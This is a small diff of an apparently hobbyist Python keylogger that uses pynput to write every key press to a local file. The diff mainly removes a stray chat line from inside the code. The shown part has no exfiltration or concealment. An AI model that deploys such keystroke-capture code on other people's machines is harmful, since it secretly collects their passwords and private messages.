@@ -11,7 +11,7 @@ def on_press(key):
                 file.write(f"[SPACE]\n")
             elif key ==  Key.enter:
                 file.write(f"\n")
-            else:hi i made a key logger in python 
+            else: 
                 file.write(f"{key}\n")
 
 def on_release(key):
@@ -21,4 +21,5 @@ def on_release(key):
 with Listener(on_press=on_press,on_release=on_release) as listener:
     listener.join()
                 
+
 
